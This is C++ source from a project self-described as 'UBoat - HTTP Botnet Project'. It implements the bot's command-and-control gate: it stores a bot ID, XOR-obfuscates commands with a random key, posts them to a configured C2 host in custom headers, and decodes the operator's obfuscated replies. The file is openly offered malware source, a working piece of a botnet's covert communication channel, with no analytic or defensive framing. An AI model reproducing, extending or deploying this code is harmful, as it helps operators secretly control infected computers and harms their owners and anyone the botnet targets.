/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#include <cstring>
#include <string>

#include "Gate.h"
#include "GateHelper.h"
#include "HttpQuery.h"
#include "WebSafeEncryption.h"

std::string botId = "-1";

void SetBotId(const std::string& newId)
{
    botId.assign(newId);
}

const std::string& GetBotId()
{
    return botId;
}

std::string SendCommandWithDecodedResponse(const std::string& command)
{
    std::string key = GenerateKey(32);
    XorResult xored = GetEncodedXorResult(command, key);

    NameValuePair* headers[] = {
        new NameValuePair("X-Token", xored.key.c_str()),
        new NameValuePair("X-Id", GetBotId().c_str()),
        0
    };

    NameValuePair* postData[] = {
        new NameValuePair("x", xored.content.c_str()),
        0
    };

    NameValuePair** returnedHeaders;
    char* returnedData;
    int dataLength;

    int result = HTTPQuery(GATE_HOST, GATE_PATH, headers, &returnedHeaders, &returnedData, &dataLength, true, "POST", postData);
#ifdef _DEBUG_
    printf("HTTPQuery ret: %d.\n", result);
#endif

    char* newKey = 0;

    NameValuePair** headerPointer = returnedHeaders;

    while (headerPointer != 0 && *headerPointer != 0) {
        if (strcmp((*headerPointer)->Name, "X-Token") == 0) {
            newKey = (char*)(*headerPointer)->Value;
            break;
        }

        headerPointer++;
    }

    std::string decoded = GetDecodedXorResult(returnedData, newKey);

    int i = 0;
    while (headers[i] != 0) {
        delete (headers[i]);
        i++;
    }

    i = 0;
    while (postData[i] != 0) {
        delete (postData[i]);
        i++;
    }

    FreeHTTPResponse(returnedHeaders, returnedData);

    return decoded;
}
